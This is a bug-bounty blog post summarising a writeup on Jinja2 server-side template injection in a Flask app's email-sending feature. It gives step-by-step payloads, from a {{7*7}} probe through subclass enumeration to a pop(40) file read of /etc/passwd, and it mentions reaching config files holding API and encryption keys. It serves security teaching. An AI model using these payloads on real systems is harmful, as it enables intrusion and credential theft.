---
layout: post
title:  Bug-Bounty-Writeups-Summary-4
date:   2019-10-31
categories: Bug-Bounty-Writeups-Summarry
comments: false
---
Hello friends, Here is Part 4 of Bug Hunting Writeup Summary ->


### 1. https://medium.com/@akshukatkar/rce-with-flask-jinja-template-injection-ea5d0201b870

RCE with Flask Jinja Template Injection - By Akshay Katkar

Well, this is very awesome writeup and we can learn RCE using flask jinja template injection.

Here is the Key Learn from writeup ->

* The program which he got was private , and  had not large scope, just a single app with lots of features to test

* First, The Author tried to know Technology used by Target  using "**Wappalyzer**" add-on

*  The Target was using Angular dart , python Django & flask

* So, whenever we see python related technologies like Flask and Django , we must try flask ninja template injection as a TRY

* The author knows Python very well and having a good experience with it, and know where developer makes mistake

* The Target have One **Utility** named as **work flow builder**, which is use to build  a financial close process flow. We can Automate daily activities with it like sending approval & sending reminder emails

* Sending Email Functionality , Author said that most of the times e**mail generator apps** are **vulnerable** to **Template Injection**

* Author thought of target sing Jinja2 template as target was built with Python

* Send Email functions have 3 Fields -><br>
a) To<br>
b) Title<br>
c) Description<br>

* He used Payload ->

```python
{{7*7}}
```
in **Title** and **Description** field and click on send email buttion.

* He got email as **"49"** in Subject and 

```python
{{7*7}}
``` 
as Description. That mean Subject field is vulnerable to Template Injection

![](https://miro.medium.com/max/1111/1*DPLFosKmDKcxqKSkw9J2Zw.png)

<br>

* 

```python
{{7 * 7}}
``` 
what this doing is evaluating python code inside curly brackets

* Now, he tried another payload to get list of sub classes of object class

```python
Payload : {{ [].__class__.__base__.__subclasses__() }}
```
<br><br>
Response He got like this -><br>

![](https://miro.medium.com/max/1509/1*k__m6Ah1EvCEmDL-18aecQ.png)

<br><br>

* Now, the best part is Author explain the code above he used ->

```python
1. []  
This is used to create list in Python

2. [].__class__
<type 'list'>   #return class of list

List is sub class of “object” class.

3. Access sub classes of object class .

[].__class__.__base__.__subclasses__()
[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>.....

This payload gives us a list of all sub classes “object” class.
```
<br><br>
* Now to make this vulnerability to P1 he need to provide POC of using commands like '/etc/passwd' , 'id', 'whoami' etc
<br>

* Author told us that -> 
<br>

"**Most of django apps have config file which contains really sensitive info like AWS keys , API’s & encryption keys.**" 

<br>

* Author already knew path of config file becuase of his previous findings, So for this writeup POC, he decided to read a file. [/etc/passwd]
<br>

* So, to read a file in Python we have to create object of **"file"**.

```python
[].__class__.__base__.__subclasses__().index(file)
40  #return index of "file" object
```

this payload in python interpreter we will get index of “file” object

<br>

* When he tried that payload didn't work. He got error like this -><br><br>


![](https://miro.medium.com/max/1075/1*CLXJs210jIR0nQXjTT2cjw.png)

<br>

* Next he tried to directly access file object like this ->

```python
{{[].__class__.__base__.__subclasses__()[40] }}
```
<br>

But again failed.

* It's mean Payload is breaking somewhere.After some try he concluded that may be indexing is block or breaking his payload

* So, Author now told us that in Python to return  a value of list "pop" method is use.
As example ->

<br>

```python
>>> [1,2,3,4,5].pop(2) 
3
```

* Base on that he created payload like ->
                    
```python
{{[].__class__.__base__.__subclasses__().pop(40) }}
```
That payload gave  object of **"file"**

<br>

![](https://miro.medium.com/max/1239/1*WqZboWvRQfrEbRQeBR2sIg.png)
<br>

* Now for read "/etc/passwd" ->

```python
{{[].__class__.__base__.__subclasses__().pop(40)('etc/passwd').read() }}
```


![](https://miro.medium.com/max/1114/1*QpfhUYMZ5Unug8qzu69KFA.png)
<br>

* So, now we can read "/etc/passwd" file on server.

* Now author can read local files on the GCE instance responsible for sending notifications, including some source code, and configuration files containing very sensitive values (e.g. API and encryption keys).
<br>

This is very superb writeup by Akshay Katkar, We learn many things from this writeup

<br>

Like , first anyalyze the target technologies, understand the application functionalities, understand python usages for read file and when stuck tried some experiments instead of giving up.



